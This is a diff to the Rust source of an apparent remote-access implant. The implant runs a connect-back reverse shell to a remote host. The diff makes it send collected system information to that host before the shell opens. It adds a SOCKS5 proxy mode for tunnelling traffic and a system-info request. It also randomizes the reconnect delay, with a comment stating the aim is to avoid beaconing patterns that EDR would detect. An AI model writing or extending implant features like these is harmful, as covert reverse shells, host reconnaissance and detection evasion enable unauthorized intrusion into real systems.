@@ -1,4 +1,5 @@
 use log::{error, info, warn};
+use rand::Rng;
 use std::path::Path;
 use tokio::time::{sleep, Duration};
 
@@ -10,6 +11,7 @@ use crate::{
     helpers::NoiseLayerExt,
     noise::{NoiseLayer, NoiseListener},
     pty::Pty,
+    sysinfo::SystemInfo,
 };
 
 /// Validate and sanitize a file path received from a remote client.
@@ -130,6 +132,13 @@ pub async fn run_connect_back_mode(host: &str, port: u16, delay: u64, psk: &str)
                     info!("Remote public key: {}", STANDARD.encode(remote_key));
                 }
 
+                // Send system info before starting shell
+                info!("Sending system info to client");
+                if let Err(e) = send_sysinfo(&mut layer).await {
+                    error!("Failed to send system info: {e}");
+                    continue;
+                }
+
                 // In connect-back mode, server initiates a shell session
                 info!("Initiating reverse shell session");
 
@@ -149,12 +158,20 @@ pub async fn run_connect_back_mode(host: &str, port: u16, delay: u64, psk: &str)
             }
         }
 
-        info!("Waiting {delay} seconds before next connection attempt...");
-        sleep(Duration::from_secs(delay)).await;
+        // Jitter: randomize delay to avoid fixed beaconing patterns detectable by EDR
+        let jitter_range = delay / 4; // ±25% of base delay
+        let jittered_delay = if jitter_range > 0 {
+            let offset = rand::thread_rng().gen_range(0..=jitter_range * 2);
+            delay.saturating_sub(jitter_range) + offset
+        } else {
+            delay
+        };
+        info!("Waiting {jittered_delay} seconds before next connection attempt (base: {delay}s)");
+        sleep(Duration::from_secs(jittered_delay)).await;
     }
 }
 
-pub(crate) async fn handle_client_connection(mut layer: NoiseLayer, _psk: &str) -> TshResult<()> {
+pub async fn handle_client_connection(mut layer: NoiseLayer, _psk: &str) -> TshResult<()> {
     info!("Handling new client connection");
 
     // Show remote public key for verification
@@ -206,6 +223,18 @@ pub(crate) async fn handle_client_connection(mut layer: NoiseLayer, _psk: &str) 
                         handle_command_execution_with_data(&mut layer, &buffer[1..n]).await
                     } else {
                         handle_command_execution(&mut layer).await
+                    }
+                }
+                OperationMode::SysInfo => {
+                    info!("System info request");
+                    send_sysinfo(&mut layer).await
+                }
+                OperationMode::Socks5 => {
+                    info!("SOCKS5 proxy request");
+                    if n > 1 {
+                        crate::socks5::handle_socks5_server(&mut layer, &buffer[1..n]).await
+                    } else {
+                        Err(TshError::protocol("SOCKS5 request missing target address"))
                     }
                 }
             };
@@ -534,6 +563,20 @@ async fn send_command_result(
         }
     }
 
+    Ok(())
+}
+
+async fn send_sysinfo(layer: &mut NoiseLayer) -> TshResult<()> {
+    let info = SystemInfo::collect();
+    let json_bytes = info.to_json_bytes();
+
+    // Send SysInfo mode byte + JSON payload
+    let mut data = Vec::with_capacity(1 + json_bytes.len());
+    data.push(OperationMode::SysInfo as u8);
+    data.extend_from_slice(&json_bytes);
+    layer.write_all(&data).await?;
+
+    info!("System info sent ({} bytes)", json_bytes.len());
     Ok(())
 }
 
